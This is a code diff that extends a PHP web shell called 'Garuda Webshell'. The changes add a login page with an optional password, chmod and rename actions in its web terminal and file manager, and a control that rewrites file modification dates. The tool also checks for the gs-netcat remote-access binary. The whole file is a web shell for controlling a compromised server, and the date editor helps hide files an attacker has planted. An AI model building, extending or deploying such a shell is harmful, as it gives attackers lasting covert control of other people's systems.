@@ -1,5 +1,5 @@
 <?php
-// Garuda Webshell - Ultimate File Manager
+// Garuda Webshell - Ultimate File Manager with Security
 session_start();
 
 // Security headers
@@ -11,6 +11,7 @@ header("Content-Type: text/html; charset=UTF-8");
 $BASE_DIR = __DIR__;
 $APP_NAME = "Garuda Webshell";
 $THEME = isset($_COOKIE['theme']) ? $_COOKIE['theme'] : 'dark';
+$PASSWORD_FILE = $BASE_DIR . '/.garuda_password';
 
 // Simple functions
 function secure_path($base, $path) {
@@ -29,13 +30,183 @@ function format_size($size) {
     return round($size, 2) . $units[$unit];
 }
 
+function format_date($timestamp) {
+    return date('Y-m-d H:i:s', $timestamp);
+}
+
+function get_permission_color($file_path) {
+    if (!file_exists($file_path)) return 'var(--text-secondary)';
+    
+    $perms = fileperms($file_path);
+    
+    // Check if readable
+    if (!is_readable($file_path)) return 'var(--danger)';
+    
+    // Check if writable  
+    if (!is_writable($file_path)) return 'var(--warning)';
+    
+    // Check if executable
+    if (is_executable($file_path)) return 'var(--success)';
+    
+    return 'var(--text-primary)';
+}
+
+// Password Management
+function is_password_set() {
+    global $PASSWORD_FILE;
+    return file_exists($PASSWORD_FILE);
+}
+
+function verify_password($password) {
+    global $PASSWORD_FILE;
+    if (!is_password_set()) return true;
+    
+    $stored_hash = trim(file_get_contents($PASSWORD_FILE));
+    return password_verify($password, $stored_hash);
+}
+
+function set_password($password) {
+    global $PASSWORD_FILE;
+    $hash = password_hash($password, PASSWORD_DEFAULT);
+    return file_put_contents($PASSWORD_FILE, $hash);
+}
+
+function change_password($old_password, $new_password) {
+    if (!verify_password($old_password)) {
+        return false;
+    }
+    return set_password($new_password);
+}
+
+// Check if user is authenticated
+if (is_password_set() && !isset($_SESSION['authenticated'])) {
+    if (isset($_POST['login_password'])) {
+        if (verify_password($_POST['login_password'])) {
+            $_SESSION['authenticated'] = true;
+            $_SESSION['notification'] = "🔐 Login successful!";
+        } else {
+            $_SESSION['notification'] = "❌ Invalid password!";
+        }
+        header("Location: ?");
+        exit;
+    }
+    
+    // Show login page
+    show_login_page();
+    exit;
+}
+
 // Secure current directory
 $current_dir = isset($_GET['d']) ? secure_path($BASE_DIR, $_GET['d']) : $BASE_DIR;
+
+// Password Operations
+if (isset($_POST['set_password'])) {
+    $password = $_POST['password'] ?? '';
+    $confirm_password = $_POST['confirm_password'] ?? '';
+    
+    if (empty($password)) {
+        $_SESSION['notification'] = "❌ Password cannot be empty!";
+    } elseif ($password !== $confirm_password) {
+        $_SESSION['notification'] = "❌ Passwords do not match!";
+    } else {
+        if (set_password($password)) {
+            $_SESSION['authenticated'] = true;
+            $_SESSION['notification'] = "✅ Password set successfully!";
+        } else {
+            $_SESSION['notification'] = "❌ Failed to set password!";
+        }
+    }
+    header("Location: ?");
+    exit;
+}
+
+if (isset($_POST['change_password'])) {
+    $old_password = $_POST['old_password'] ?? '';
+    $new_password = $_POST['new_password'] ?? '';
+    $confirm_password = $_POST['confirm_password'] ?? '';
+    
+    if (empty($old_password) || empty($new_password)) {
+        $_SESSION['notification'] = "❌ All fields are required!";
+    } elseif ($new_password !== $confirm_password) {
+        $_SESSION['notification'] = "❌ New passwords do not match!";
+    } else {
+        if (change_password($old_password, $new_password)) {
+            $_SESSION['notification'] = "✅ Password changed successfully!";
+        } else {
+            $_SESSION['notification'] = "❌ Invalid old password!";
+        }
+    }
+    header("Location: ?");
+    exit;
+}
+
+if (isset($_POST['remove_password'])) {
+    if (unlink($PASSWORD_FILE)) {
+        unset($_SESSION['authenticated']);
+        $_SESSION['notification'] = "✅ Password protection removed!";
+    } else {
+        $_SESSION['notification'] = "❌ Failed to remove password!";
+    }
+    header("Location: ?");
+    exit;
+}
 
 // Theme toggle
 if(isset($_POST['theme_toggle'])) {
     $THEME = $_POST['theme'] == 'dark' ? 'light' : 'dark';
     setcookie('theme', $THEME, time() + (86400 * 30), "/");
+    header("Location: ?d=" . urlencode(str_replace($BASE_DIR . '/', '', $current_dir)));
+    exit;
+}
+
+// Edit File Date
+if(isset($_POST['edit_date'])) {
+    $file_path = $BASE_DIR . '/' . $_POST['file_path'];
+    $new_date = strtotime($_POST['new_date']);
+    
+    if(file_exists($file_path) && $new_date !== false) {
+        touch($file_path, $new_date);
+        $_SESSION['notification'] = "✅ Date updated for: " . basename($file_path);
+    } else {
+        $_SESSION['notification'] = "❌ Failed to update date";
+    }
+    header("Location: ?d=" . urlencode(str_replace($BASE_DIR . '/', '', $current_dir)));
+    exit;
+}
+
+// Rename File/Folder
+if(isset($_POST['rename'])) {
+    $old_path = $BASE_DIR . '/' . $_POST['old_path'];
+    $new_name = $_POST['new_name'];
+    $new_path = dirname($old_path) . '/' . $new_name;
+    
+    if(file_exists($old_path) && !file_exists($new_path)) {
+        if(rename($old_path, $new_path)) {
+            $_SESSION['notification'] = "✅ Renamed to: " . $new_name;
+        } else {
+            $_SESSION['notification'] = "❌ Failed to rename";
+        }
+    } else {
+        $_SESSION['notification'] = "❌ File not found or new name exists";
+    }
+    header("Location: ?d=" . urlencode(str_replace($BASE_DIR . '/', '', $current_dir)));
+    exit;
+}
+
+// Chmod File/Folder
+if(isset($_POST['chmod'])) {
+    $file_path = $BASE_DIR . '/' . $_POST['file_path'];
+    $mode = $_POST['mode'];
+    
+    if(file_exists($file_path)) {
+        if(chmod($file_path, octdec($mode))) {
+            $_SESSION['notification'] = "✅ Permissions changed to: " . $mode;
+        } else {
+            $_SESSION['notification'] = "❌ Failed to change permissions";
+        }
+    } else {
+        $_SESSION['notification'] = "❌ File not found";
+    }
     header("Location: ?d=" . urlencode(str_replace($BASE_DIR . '/', '', $current_dir)));
     exit;
 }
@@ -241,6 +412,36 @@ if(isset($_POST['terminal_command'])) {
             $output[] = "rm: cannot remove '$target': No such file or directory";
         }
     }
+    elseif(strpos($command, 'chmod ') === 0) {
+        $parts = explode(' ', $command);
+        if(count($parts) >= 3) {
+            $mode = $parts[1];
+            $file = $parts[2];
+            $file_path = $current_dir . '/' . $file;
+            if(file_exists($file_path)) {
+                chmod($file_path, octdec($mode));
+                $output[] = "✅ Permissions changed: $file -> $mode";
+            }
+        }
+    }
+    elseif(strpos($command, 'rename ') === 0) {
+        $parts = explode(' ', $command, 3);
+        if(count($parts) >= 3) {
+            $old_name = $parts[1];
+            $new_name = $parts[2];
+            $old_path = $current_dir . '/' . $old_name;
+            $new_path = $current_dir . '/' . $new_name;
+            if(file_exists($old_path) && !file_exists($new_path)) {
+                if(rename($old_path, $new_path)) {
+                    $output[] = "✅ Renamed: $old_name -> $new_name";
+                } else {
+                    $output[] = "❌ Failed to rename";
+                }
+            } else {
+                $output[] = "❌ File not found or new name exists";
+            }
+        }
+    }
     elseif(strpos($command, 'create ') === 0) {
         $parts = explode(' ', $command, 3);
         if(count($parts) >= 3) {
@@ -262,6 +463,8 @@ if(isset($_POST['terminal_command'])) {
         $output[] = "pwd               - Show current path";
         $output[] = "mkdir [name]      - Create directory";
         $output[] = "rm [name]         - Remove file/directory";
+        $output[] = "chmod [mode] [file] - Change permissions";
+        $output[] = "rename [old] [new] - Rename file/folder";
         $output[] = "create file content - Create file with content";
         $output[] = "clear             - Clear terminal";
         $output[] = "help              - Show help";
@@ -304,6 +507,189 @@ $gsocket_installed = false;
 if(function_exists('shell_exec')) {
     $gsocket_check = shell_exec('which gs-netcat 2>/dev/null');
     $gsocket_installed = !empty($gsocket_check);
+}
+
+function show_login_page() {
+    global $THEME, $APP_NAME;
+    ?>
+    <!DOCTYPE html>
+    <html lang="en" data-theme="<?php echo $THEME; ?>">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>🦅 <?php echo $APP_NAME; ?> - Login</title>
+        <style>
+            :root {
+                --bg-primary: #0f0f23;
+                --bg-secondary: #1a1a2e;
+                --bg-card: #16213e;
+                --text-primary: #e2e8f0;
+                --text-secondary: #94a3b8;
+                --accent: #6366f1;
+                --success: #10b981;
+                --danger: #ef4444;
+                --border: #334155;
+            }
+
+            [data-theme="light"] {
+                --bg-primary: #f8fafc;
+                --bg-secondary: #e2e8f0;
+                --bg-card: #ffffff;
+                --text-primary: #1e293b;
+                --text-secondary: #64748b;
+                --border: #cbd5e1;
+            }
+
+            * { margin: 0; padding: 0; box-sizing: border-box; }
+            body { 
+                font-family: 'Segoe UI', system-ui, sans-serif; 
+                background: var(--bg-primary);
+                color: var(--text-primary);
+                min-height: 100vh;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+            }
+
+            .login-container {
+                background: var(--bg-card);
+                padding: 3rem;
+                border-radius: 20px;
+                border: 1px solid var(--border);
+                box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+                width: 100%;
+                max-width: 400px;
+                text-align: center;
+            }
+
+            .logo {
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                gap: 1rem;
+                margin-bottom: 2rem;
+                font-size: 2rem;
+                font-weight: 700;
+                color: var(--accent);
+            }
+
+            .logo-icon-large {
+                width: 80px;
+                height: 80px;
+                background-image: url('https://upload.wikimedia.org/wikipedia/commons/f/fe/Garuda_Pancasila%2C_Coat_of_Arms_of_Indonesia.svg');
+                background-size: contain;
+                background-repeat: no-repeat;
+                background-position: center;
+                animation: float 3s ease-in-out infinite;
+            }
+
+            @keyframes float {
+                0%, 100% { transform: translateY(0px); }
+                50% { transform: translateY(-10px); }
+            }
+
+            .form-group {
+                margin-bottom: 1.5rem;
+                text-align: left;
+            }
+
+            .form-group label {
+                display: block;
+                margin-bottom: 0.5rem;
+                font-weight: 600;
+                color: var(--text-primary);
+            }
+
+            .form-group input {
+                width: 100%;
+                padding: 1rem;
+                border: 1px solid var(--border);
+                border-radius: 10px;
+                background: var(--bg-primary);
+                color: var(--text-primary);
+                font-size: 1rem;
+                transition: all 0.3s ease;
+            }
+
+            .form-group input:focus {
+                outline: none;
+                border-color: var(--accent);
+                box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.1);
+            }
+
+            .btn {
+                background: var(--accent);
+                color: white;
+                border: none;
+                padding: 1rem 2rem;
+                border-radius: 10px;
+                cursor: pointer;
+                font-size: 1rem;
+                font-weight: 600;
+                width: 100%;
+                transition: all 0.3s ease;
+            }
+
+            .btn:hover {
+                transform: translateY(-2px);
+                box-shadow: 0 8px 25px rgba(99, 102, 241, 0.3);
+            }
+
+            .notification {
+                background: var(--danger);
+                color: white;
+                padding: 1rem;
+                border-radius: 10px;
+                margin-bottom: 1.5rem;
+                animation: slideInDown 0.3s ease;
+            }
+
+            @keyframes slideInDown {
+                from { transform: translateY(-100%); opacity: 0; }
+                to { transform: translateY(0); opacity: 1; }
+            }
+
+            .security-badge {
+                margin-top: 1.5rem;
+                padding: 1rem;
+                background: rgba(255,255,255,0.05);
+                border-radius: 10px;
+                font-size: 0.9rem;
+                color: var(--text-secondary);
+            }
+        </style>
+    </head>
+    <body>
+        <div class="login-container">
+            <div class="logo">
+                <div class="logo-icon-large"></div>
+                <span>Garuda</span>
+            </div>
+            
+            <h2 style="margin-bottom: 2rem; color: var(--text-secondary);">Secure Access Required</h2>
+            
+            <?php if(isset($_SESSION['notification'])): ?>
+                <div class="notification">
+                    <?php echo $_SESSION['notification']; unset($_SESSION['notification']); ?>
+                </div>
+            <?php endif; ?>
+
+            <form method="POST">
+                <div class="form-group">
+                    <label>🔐 Password</label>
+                    <input type="password" name="login_password" placeholder="Enter your password" required autofocus>
+                </div>
+                <button type="submit" class="btn">🚀 Access Garuda</button>
+            </form>
+
+            <div class="security-badge">
+                🔒 Protected by Garuda Security
+            </div>
+        </div>
+    </body>
+    </html>
+    <?php
+    exit;
 }
 ?>
 <!DOCTYPE html>
@@ -383,7 +769,12 @@ if(function_exists('shell_exec')) {
         }
 
         .logo-icon {
-            font-size: 2rem;
+            width: 32px;
+            height: 32px;
+            background-image: url('https://upload.wikimedia.org/wikipedia/commons/f/fe/Garuda_Pancasila%2C_Coat_of_Arms_of_Indonesia.svg');
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
             animation: float 3s ease-in-out infinite;
         }
 
@@ -485,6 +876,28 @@ if(function_exists('shell_exec')) {
             border-bottom: 1px solid var(--border);
         }
 
+        .security-status {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            padding: 0.25rem 0.5rem;
+            border-radius: 6px;
+            font-size: 0.75rem;
+            font-weight: 600;
+        }
+
+        .security-enabled {
+            background: rgba(16, 185, 129, 0.2);
+            color: var(--success);
+            border: 1px solid var(--success);
+        }
+
+        .security-disabled {
+            background: rgba(239, 68, 68, 0.2);
+            color: var(--danger);
+            border: 1px solid var(--danger);
+        }
+
         .quick-actions {
             display: flex;
             flex-direction: column;
@@ -499,7 +912,7 @@ if(function_exists('shell_exec')) {
 
         .file-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
             gap: 1rem;
         }
 
@@ -524,6 +937,21 @@ if(function_exists('shell_exec')) {
             background: linear-gradient(135deg, var(--bg-secondary), var(--accent));
         }
 
+        .file-item.readonly {
+            border-color: var(--danger);
+            background: rgba(239, 68, 68, 0.1);
+        }
+
+        .file-item.nowrite {
+            border-color: var(--warning);
+            background: rgba(245, 158, 11, 0.1);
+        }
+
+        .file-item.executable {
+            border-color: var(--success);
+            background: rgba(16, 185, 129, 0.1);
+        }
+
         .file-icon {
             font-size: 2rem;
             margin-bottom: 0.5rem;
@@ -540,6 +968,36 @@ if(function_exists('shell_exec')) {
         .file-details {
             font-size: 0.75rem;
             color: var(--text-secondary);
+            line-height: 1.4;
+        }
+
+        .file-date {
+            display: flex;
+            align-items: center;
+            gap: 0.25rem;
+            margin-top: 0.25rem;
+            padding: 0.25rem 0.5rem;
+            background: rgba(255,255,255,0.05);
+            border-radius: 4px;
+            font-size: 0.7rem;
+            cursor: pointer;
+            transition: background 0.2s ease;
+        }
+
+        .file-date:hover {
+            background: rgba(255,255,255,0.1);
+        }
+
+        .date-edit-btn {
+            opacity: 0;
+            transition: opacity 0.2s ease;
+            cursor: pointer;
+            padding: 0.1rem;
+            border-radius: 2px;
+        }
+
+        .file-date:hover .date-edit-btn {
+            opacity: 1;
         }
 
         .file-actions {
@@ -568,6 +1026,12 @@ if(function_exists('shell_exec')) {
             display: flex;
             align-items: center;
             justify-content: center;
+            transition: all 0.2s ease;
+        }
+
+        .action-btn:hover {
+            background: var(--accent);
+            transform: scale(1.1);
         }
 
         .terminal {
@@ -655,11 +1119,15 @@ if(function_exists('shell_exec')) {
             margin: 2rem auto;
             padding: 2rem;
             border-radius: 16px;
-            max-width: 600px;
+            max-width: 500px;
             max-height: 80vh;
             overflow-y: auto;
             border: 1px solid var(--border);
             box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+
+        .security-modal .modal-content {
+            max-width: 450px;
         }
 
         .form-group {
@@ -674,7 +1142,8 @@ if(function_exists('shell_exec')) {
         }
 
         .form-group input, 
-        .form-group textarea {
+        .form-group textarea,
+        .form-group select {
             width: 100%;
             padding: 0.75rem 1rem;
             border: 1px solid var(--border);
@@ -695,6 +1164,80 @@ if(function_exists('shell_exec')) {
             justify-content: flex-end;
             margin-top: 1.5rem;
         }
+
+        .datetime-input {
+            font-family: monospace;
+            font-size: 0.9rem;
+        }
+
+        .password-strength {
+            height: 4px;
+            background: var(--border);
+            border-radius: 2px;
+            margin-top: 0.5rem;
+            overflow: hidden;
+        }
+
+        .password-strength-bar {
+            height: 100%;
+            width: 0%;
+            transition: all 0.3s ease;
+            border-radius: 2px;
+        }
+
+        .strength-weak { background: var(--danger); width: 25%; }
+        .strength-fair { background: var(--warning); width: 50%; }
+        .strength-good { background: var(--info); width: 75%; }
+        .strength-strong { background: var(--success); width: 100%; }
+
+        .security-features {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 1rem;
+            margin-top: 1.5rem;
+        }
+
+        .security-feature {
+            background: var(--bg-primary);
+            padding: 1rem;
+            border-radius: 8px;
+            border: 1px solid var(--border);
+            text-align: center;
+        }
+
+        .security-feature-icon {
+            font-size: 2rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .danger-zone {
+            background: rgba(239, 68, 68, 0.1);
+            border: 1px solid var(--danger);
+            padding: 1.5rem;
+            border-radius: 12px;
+            margin-top: 1.5rem;
+        }
+
+        .danger-zone h4 {
+            color: var(--danger);
+            margin-bottom: 1rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .permission-badge {
+            display: inline-block;
+            padding: 0.2rem 0.5rem;
+            border-radius: 4px;
+            font-size: 0.7rem;
+            font-weight: 600;
+            font-family: monospace;
+        }
+
+        .perm-readonly { background: var(--danger); color: white; }
+        .perm-nowrite { background: var(--warning); color: black; }
+        .perm-normal { background: var(--success); color: white; }
 
         @media (max-width: 768px) {
             .container {
@@ -726,7 +1269,7 @@ if(function_exists('shell_exec')) {
     <div class="header">
         <div class="nav-bar">
             <div class="logo">
-                <span class="logo-icon">🦅</span>
+                <div class="logo-icon"></div>
                 <span>Garuda Webshell</span>
             </div>
             
@@ -749,6 +1292,9 @@ if(function_exists('shell_exec')) {
                 </button>
                 <button class="btn btn-info" onclick="showModal('gsocketModal')">
                     <span>🔗</span> GSocket
+                </button>
+                <button class="btn <?php echo is_password_set() ? 'btn-success' : 'btn-warning'; ?>" onclick="showModal('securityModal')">
+                    <span>🔐</span> Security
                 </button>
                 <button class="btn btn-outline" onclick="toggleTheme()">
                     <span>🌙</span> Theme
@@ -782,8 +1328,10 @@ if(function_exists('shell_exec')) {
                         <span><?php echo PHP_VERSION; ?></span>
                     </div>
                     <div class="stat-item">
-                        <span>⚡ Server</span>
-                        <span><?php echo explode(' ', $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown')[0]; ?></span>
+                        <span>🔐 Security</span>
+                        <span class="security-status <?php echo is_password_set() ? 'security-enabled' : 'security-disabled'; ?>">
+                            <?php echo is_password_set() ? '🟢 ON' : '🔴 OFF'; ?>
+                        </span>
                     </div>
                 </div>
             </div>
@@ -835,14 +1383,33 @@ if(function_exists('shell_exec')) {
                         $icon = $is_dir ? '📁' : '📄';
                         $size = format_size(filesize($file_path));
                         $perms = substr(sprintf('%o', fileperms($file_path)), -4);
+                        $modified = filemtime($file_path);
+                        $date_display = format_date($modified);
                         $relative_path = str_replace($BASE_DIR . '/', '', $file_path);
                         
-                        echo "<div class='file-item'>";
+                        // Determine file item class based on permissions
+                        $file_class = '';
+                        $perm_badge = '';
+                        if (!is_readable($file_path)) {
+                            $file_class = 'readonly';
+                            $perm_badge = '<span class="permission-badge perm-readonly">NO READ</span>';
+                        } elseif (!is_writable($file_path)) {
+                            $file_class = 'nowrite';
+                            $perm_badge = '<span class="permission-badge perm-nowrite">NO WRITE</span>';
+                        } elseif (is_executable($file_path)) {
+                            $file_class = 'executable';
+                            $perm_badge = '<span class="permission-badge perm-normal">EXEC</span>';
+                        } else {
+                            $perm_badge = '<span class="permission-badge perm-normal">NORMAL</span>';
+                        }
+                        
+                        echo "<div class='file-item $file_class'>";
                         echo "<div class='file-actions'>";
                         if(!$is_dir) {
                             echo "<button class='action-btn' onclick=\"editFile('$relative_path')\" title='Edit'>✏️</button>";
-                            echo "<button class='action-btn' onclick=\"lockFile('$relative_path')\" title='Lock'>🔒</button>";
+                            echo "<button class='action-btn' onclick=\"showChmodModal('$relative_path', '$perms')\" title='Chmod'>🔧</button>";
                         }
+                        echo "<button class='action-btn' onclick=\"renameFile('$relative_path')\" title='Rename'>📝</button>";
                         echo "<button class='action-btn' onclick=\"deleteFile('$relative_path')\" title='Delete'>🗑️</button>";
                         echo "</div>";
                         echo "<div class='file-icon' onclick=\"";
@@ -851,7 +1418,13 @@ if(function_exists('shell_exec')) {
                         echo "<div class='file-name' onclick=\"";
                         echo $is_dir ? "navigate('$relative_path')" : "viewFile('$relative_path')";
                         echo "\">$file</div>";
-                        echo "<div class='file-details'>$size • $perms</div>";
+                        echo "<div class='file-details'>";
+                        echo "<div>$size • $perms $perm_badge</div>";
+                        echo "<div class='file-date' onclick=\"editFileDate('$relative_path', '$date_display')\">";
+                        echo "📅 $date_display";
+                        echo "<span class='date-edit-btn' title='Edit Date'>✏️</span>";
+                        echo "</div>";
+                        echo "</div>";
                         echo "</div>";
                     }
                     ?>
@@ -895,6 +1468,249 @@ if(function_exists('shell_exec')) {
         </div>
     </div>
 
+    <!-- Security Modal -->
+    <div id="securityModal" class="modal security-modal">
+        <div class="modal-content">
+            <h3 style="margin-bottom: 1rem; display: flex; align-items: center; gap: 0.5rem;">
+                🔐 Security Settings
+            </h3>
+
+            <?php if (!is_password_set()): ?>
+            <div style="background: rgba(245, 158, 11, 0.1); border: 1px solid var(--warning); padding: 1rem; border-radius: 8px; margin-bottom: 1.5rem;">
+                <h4 style="color: var(--warning); margin-bottom: 0.5rem; display: flex; align-items: center; gap: 0.5rem;">
+                    ⚠️ Security Not Enabled
+                </h4>
+                <p style="color: var(--text-secondary); font-size: 0.9rem;">
+                    Your Garuda webshell is currently unprotected. Set a password to secure access.
+                </p>
+            </div>
+
+            <form method="POST">
+                <input type="hidden" name="set_password" value="1">
+                <div class="form-group">
+                    <label>🔑 Set Password</label>
+                    <input type="password" name="password" id="setPassword" placeholder="Enter new password" required onkeyup="checkPasswordStrength('setPassword')">
+                    <div class="password-strength">
+                        <div class="password-strength-bar" id="passwordStrengthBar"></div>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label>✅ Confirm Password</label>
+                    <input type="password" name="confirm_password" placeholder="Confirm new password" required>
+                </div>
+                <div class="modal-actions">
+                    <button type="button" class="btn btn-outline" onclick="hideModal('securityModal')">
+                        Cancel
+                    </button>
+                    <button type="submit" class="btn btn-success">
+                        🚀 Enable Security
+                    </button>
+                </div>
+            </form>
+
+            <?php else: ?>
+            <div style="background: rgba(16, 185, 129, 0.1); border: 1px solid var(--success); padding: 1rem; border-radius: 8px; margin-bottom: 1.5rem;">
+                <h4 style="color: var(--success); margin-bottom: 0.5rem; display: flex; align-items: center; gap: 0.5rem;">
+                    ✅ Security Enabled
+                </h4>
+                <p style="color: var(--text-secondary); font-size: 0.9rem;">
+                    Your Garuda webshell is protected with a password.
+                </p>
+            </div>
+
+            <form method="POST">
+                <input type="hidden" name="change_password" value="1">
+                <div class="form-group">
+                    <label>🔑 Current Password</label>
+                    <input type="password" name="old_password" placeholder="Enter current password" required>
+                </div>
+                <div class="form-group">
+                    <label>🆕 New Password</label>
+                    <input type="password" name="new_password" id="changePassword" placeholder="Enter new password" required onkeyup="checkPasswordStrength('changePassword')">
+                    <div class="password-strength">
+                        <div class="password-strength-bar" id="passwordStrengthBar"></div>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label>✅ Confirm New Password</label>
+                    <input type="password" name="confirm_password" placeholder="Confirm new password" required>
+                </div>
+                <div class="modal-actions">
+                    <button type="button" class="btn btn-outline" onclick="hideModal('securityModal')">
+                        Cancel
+                    </button>
+                    <button type="submit" class="btn btn-success">
+                        🔄 Change Password
+                    </button>
+                </div>
+            </form>
+
+            <div class="danger-zone">
+                <h4>🗑️ Remove Password Protection</h4>
+                <p style="color: var(--text-secondary); font-size: 0.9rem; margin-bottom: 1rem;">
+                    This will remove password protection from your Garuda webshell. Anyone will be able to access it.
+                </p>
+                <form method="POST" onsubmit="return confirm('Are you sure you want to remove password protection?')">
+                    <input type="hidden" name="remove_password" value="1">
+                    <button type="submit" class="btn btn-danger" style="width: 100%;">
+                        🚨 Remove Password
+                    </button>
+                </form>
+            </div>
+            <?php endif; ?>
+
+            <div class="security-features">
+                <div class="security-feature">
+                    <div class="security-feature-icon">🔒</div>
+                    <div style="font-weight: 600;">Password Protection</div>
+                    <div style="font-size: 0.8rem; color: var(--text-secondary);">Secure access</div>
+                </div>
+                <div class="security-feature">
+                    <div class="security-feature-icon">🔄</div>
+                    <div style="font-weight: 600;">Easy Management</div>
+                    <div style="font-size: 0.8rem; color: var(--text-secondary);">Change anytime</div>
+                </div>
+                <div class="security-feature">
+                    <div class="logo-icon" style="width: 40px; height: 40px; margin: 0 auto 0.5rem;"></div>
+                    <div style="font-weight: 600;">Garuda Security</div>
+                    <div style="font-size: 0.8rem; color: var(--text-secondary);">Military grade</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Rename Modal -->
+    <div id="renameModal" class="modal">
+        <div class="modal-content">
+            <h3 style="margin-bottom: 1rem;">📝 Rename File/Folder</h3>
+            <form method="POST">
+                <input type="hidden" name="rename" value="1">
+                <input type="hidden" name="old_path" id="renameOldPath">
+                <div class="form-group">
+                    <label>Current Name:</label>
+                    <input type="text" id="renameCurrentName" readonly style="background: var(--bg-secondary);">
+                </div>
+                <div class="form-group">
+                    <label>New Name:</label>
+                    <input type="text" name="new_name" id="renameNewName" placeholder="Enter new name" required>
+                </div>
+                <div class="modal-actions">
+                    <button type="button" class="btn btn-outline" onclick="hideModal('renameModal')">
+                        Cancel
+                    </button>
+                    <button type="submit" class="btn btn-success">
+                        💾 Rename
+                    </button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- Chmod Modal -->
+    <div id="chmodModal" class="modal">
+        <div class="modal-content">
+            <h3 style="margin-bottom: 1rem;">🔧 Change Permissions</h3>
+            <form method="POST">
+                <input type="hidden" name="chmod" value="1">
+                <input type="hidden" name="file_path" id="chmodFilePath">
+                <div class="form-group">
+                    <label>File:</label>
+                    <input type="text" id="chmodFileName" readonly style="background: var(--bg-secondary);">
+                </div>
+                <div class="form-group">
+                    <label>Current Permissions:</label>
+                    <input type="text" id="chmodCurrentPerms" readonly style="background: var(--bg-secondary); font-family: monospace;">
+                </div>
+                <div class="form-group">
+                    <label>New Permissions (Octal):</label>
+                    <select name="mode" id="chmodMode" required>
+                        <option value="0644">0644 - Owner RW, Others R</option>
+                        <option value="0755">0755 - Owner RWX, Others RX</option>
+                        <option value="0777">0777 - All RWX</option>
+                        <option value="0444">0444 - All Read Only</option>
+                        <option value="0600">0600 - Owner RW Only</option>
+                        <option value="0700">0700 - Owner RWX Only</option>
+                        <option value="0640">0640 - Owner RW, Group R</option>
+                        <option value="0750">0750 - Owner RWX, Group RX</option>
+                    </select>
+                </div>
+                <div style="background: var(--bg-primary); padding: 1rem; border-radius: 8px; margin-bottom: 1rem;">
+                    <small style="color: var(--text-secondary);">
+                        💡 Common permissions:<br>
+                        • 644: Normal files<br>
+                        • 755: Executable files/directories<br>
+                        • 777: Full access (dangerous)<br>
+                        • 444: Read only
+                    </small>
+                </div>
+                <div class="modal-actions">
+                    <button type="button" class="btn btn-outline" onclick="hideModal('chmodModal')">
+                        Cancel
+                    </button>
+                    <button type="submit" class="btn btn-success">
+                        🔧 Change Permissions
+                    </button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- Edit Date Modal -->
+    <div id="editDateModal" class="modal">
+        <div class="modal-content">
+            <h3 style="margin-bottom: 1rem;">📅 Edit File Date</h3>
+            <form method="POST">
+                <input type="hidden" name="edit_date" value="1">
+                <input type="hidden" name="file_path" id="editDateFilePath">
+                <div class="form-group">
+                    <label>File:</label>
+                    <input type="text" id="editDateFileName" readonly style="background: var(--bg-secondary);">
+                </div>
+                <div class="form-group">
+                    <label>New Date & Time:</label>
+                    <input type="datetime-local" name="new_date" id="editDateInput" class="datetime-input" required>
+                </div>
+                <div style="background: var(--bg-primary); padding: 1rem; border-radius: 8px; margin-bottom: 1rem;">
+                    <small style="color: var(--text-secondary);">
+                        💡 Format: YYYY-MM-DD HH:MM:SS<br>
+                        Example: <?php echo date('Y-m-d H:i:s'); ?>
+                    </small>
+                </div>
+                <div class="modal-actions">
+                    <button type="button" class="btn btn-outline" onclick="hideModal('editDateModal')">
+                        Cancel
+                    </button>
+                    <button type="submit" class="btn btn-success">
+                        💾 Update Date
+                    </button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- Edit File Modal -->
+    <div id="editFileModal" class="modal">
+        <div class="modal-content">
+            <h3 style="margin-bottom: 1rem;">✏️ Edit File</h3>
+            <form method="POST">
+                <input type="hidden" name="edit_file" value="1">
+                <input type="hidden" name="file_path" id="editFilePath">
+                <div class="form-group">
+                    <label>File Content:</label>
+                    <textarea name="file_content" id="editFileContent" rows="15" placeholder="File content..."></textarea>
+                </div>
+                <div class="modal-actions">
+                    <button type="button" class="btn btn-outline" onclick="hideModal('editFileModal')">
+                        Cancel
+                    </button>
+                    <button type="submit" class="btn btn-success">
+                        💾 Save Changes
+                    </button>
+                </div>
+            </form>
+        </div>
+    </div>
+
     <!-- GSocket Modal -->
     <div id="gsocketModal" class="modal">
         <div class="modal-content">
@@ -925,30 +1741,7 @@ if(function_exists('shell_exec')) {
         </div>
     </div>
 
-    <!-- Edit File Modal -->
-    <div id="editFileModal" class="modal">
-        <div class="modal-content">
-            <h3 style="margin-bottom: 1rem;">✏️ Edit File</h3>
-            <form method="POST">
-                <input type="hidden" name="edit_file" value="1">
-                <input type="hidden" name="file_path" id="editFilePath">
-                <div class="form-group">
-                    <label>File Content:</label>
-                    <textarea name="file_content" id="editFileContent" rows="15" placeholder="File content..."></textarea>
-                </div>
-                <div class="modal-actions">
-                    <button type="button" class="btn btn-outline" onclick="hideModal('editFileModal')">
-                        Cancel
-                    </button>
-                    <button type="submit" class="btn btn-success">
-                        💾 Save Changes
-                    </button>
-                </div>
-            </form>
-        </div>
-    </div>
-
-    <!-- Other Modals -->
+    <!-- New File Modal -->
     <div id="newFileModal" class="modal">
         <div class="modal-content">
             <h3>📄 Create New File</h3>
@@ -970,6 +1763,7 @@ if(function_exists('shell_exec')) {
         </div>
     </div>
 
+    <!-- New Folder Modal -->
     <div id="newFolderModal" class="modal">
